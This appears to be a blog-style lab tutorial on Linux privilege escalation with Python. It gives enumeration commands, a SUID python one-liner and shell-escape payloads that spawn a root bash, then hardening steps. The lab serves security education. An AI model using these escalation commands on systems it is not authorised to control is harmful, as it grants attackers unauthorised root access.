---
title: Manual Privilege Escalation Using Python
date: 2024-01-12 08:01:35 +0300
subtitle: Product Design
image: '/images/812.png'
---
# Manual Privilege Escalation Using Python

## **Objective**
Learn how to identify and exploit privilege escalation opportunities on a Linux system using Python scripts and techniques, and understand how to secure systems against such attacks.

---

## **Purpose**
Privilege escalation vulnerabilities allow attackers to gain elevated permissions on a system, enabling unauthorized actions. Python can be leveraged to exploit these vulnerabilities due to its flexibility and ease of use. This lab demonstrates common scenarios and best practices for mitigation.

---

## **Tools Required**
- **Kali Linux** or another Linux distribution.
- Basic knowledge of Python scripting.
- A test environment with limited user privileges.

---

## **Lab Topology**
- **Kali Linux**: Running as a limited user to simulate real-world privilege escalation scenarios.
- **Target System**: The same system or a virtual machine configured for testing.

---

## **Walkthrough**

### **Task 1: Setting Up the Environment**
1. **Create a Low-Privilege User**:
   - Log in as a root or privileged user.
   - Create a new user:
     ```bash
     sudo useradd -m limiteduser
     sudo passwd limiteduser
     ```

2. **Log in as the Low-Privilege User**:
   - Switch to the new user:
     ```bash
     su - limiteduser
     ```

3. **Verify Limited Privileges**:
   - Check the user's groups and privileges:
     ```bash
     id
     sudo -l
     ```
   - Ensure the user cannot execute privileged commands.

---

### **Task 2: Identifying Privilege Escalation Opportunities**
1. **Search for Writable Files**:
   - Identify writable files owned by root:
     ```bash
     find / -writable -user root 2>/dev/null
     ```
   - Focus on files that are executable or configuration files.

2. **Look for Sudo Misconfigurations**:
   - Check sudo permissions:
     ```bash
     sudo -l
     ```
   - Look for scripts or commands that can be run without a password.

3. **Identify SUID Binaries**:
   - Search for binaries with the SUID bit set:
     ```bash
     find / -perm -4000 -type f 2>/dev/null
     ```
   - Note binaries like `python`, `bash`, or custom scripts.

---

### **Task 3: Exploiting Privilege Escalation with Python**

#### **1. Using Python to Spawn a Root Shell**
1. **Locate a SUID Python Binary**:
   - If `python` is listed in the SUID search, proceed.

2. **Exploit the SUID Binary**:
   - Run the following command to spawn a root shell:
     ```bash
     ./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
     ```
   - Verify root access:
     ```bash
     whoami
     ```

#### **2. Exploiting Writable Scripts**
1. **Find a Writable Script Executed by Root**:
   - Look for scripts owned by root but writable by others.
   - Example: `/usr/local/bin/backup.py`.

2. **Modify the Script**:
   - Append the following payload:
     ```python
     import os
     os.system("/bin/bash")
     ```

3. **Trigger the Script**:
   - Wait for or manually execute the script if possible:
     ```bash
     sudo /usr/local/bin/backup.py
     ```
   - Verify root access.

#### **3. Exploiting Sudo Misconfigurations**
1. **Identify a Vulnerable Command**:
   - If a Python command can be run with `sudo`:
     ```bash
     sudo python
     ```

2. **Spawn a Shell**:
   - Run the following in the Python shell:
     ```python
     import os
     os.system("/bin/bash")
     ```
   - Verify elevated privileges.

---

### **Task 4: Securing Against Privilege Escalation**
1. **Restrict File Permissions**:
   - Use least privilege principles:
     ```bash
     chmod 644 /path/to/file
     ```

2. **Audit SUID Binaries**:
   - Remove the SUID bit from unnecessary binaries:
     ```bash
     chmod -s /path/to/binary
     ```

3. **Harden Sudo Configuration**:
   - Limit which users can execute specific commands:
     ```bash
     visudo
     ```
   - Remove unnecessary entries.

4. **Monitor and Log Activities**:
   - Use tools like `auditd` to track changes and executions.

5. **Regular Updates**:
   - Keep the system updated to patch known privilege escalation vulnerabilities.

---

## **Best Practices**
1. **Use Principle of Least Privilege (PoLP)**:
   - Grant users only the permissions they need.

2. **Regularly Audit Systems**:
   - Identify and mitigate misconfigurations or insecure practices.

3. **Educate Users**:
   - Train users to avoid common pitfalls, such as misusing permissions.

4. **Isolate Environments**:
   - Use containers or virtual machines for executing untrusted scripts.

---

## **Key Takeaways**
1. Python can be a powerful tool for both exploiting and securing privilege escalation vulnerabilities.
2. Identifying SUID binaries, writable scripts, and sudo misconfigurations is key to escalating privileges.
3. Regular audits, proper permissions, and secure configurations can prevent privilege escalation attacks.

---

## **Troubleshooting Tips**
1. **SUID Binary Not Found**:
   - Ensure you have searched all directories.
   - Focus on custom binaries or scripts.

2. **Exploit Does Not Work**:
   - Check the script or binary for proper permissions.
   - Verify the Python version and SUID configuration.

3. **Access Denied**:
   - Ensure the user has access to the target script or binary.
   - Test other privilege escalation vectors.

By completing this lab, you now understand how to manually escalate privileges using Python and how to secure systems against these vulnerabilities.